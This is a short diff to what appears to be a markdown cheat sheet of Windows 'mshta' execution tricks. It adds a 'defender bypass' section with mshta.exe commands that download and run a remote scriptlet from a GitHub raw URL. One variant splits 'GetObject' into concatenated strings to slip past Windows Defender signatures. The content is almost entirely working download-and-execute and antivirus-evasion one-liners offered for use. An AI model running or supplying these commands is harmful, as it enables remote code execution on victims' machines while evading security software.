@@ -15,5 +15,11 @@ mshta
 <br><br>
 `mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js");close();`
 
+defender bypass
+<br><br>
+`mshta.exe vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"")"))`
+<br>
+`mshta.exe vbscript:Close(Execute("GetO"+"bject"+"(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"")"))`
+
 
 <br><br>ads method suggested by @yeyint_mth
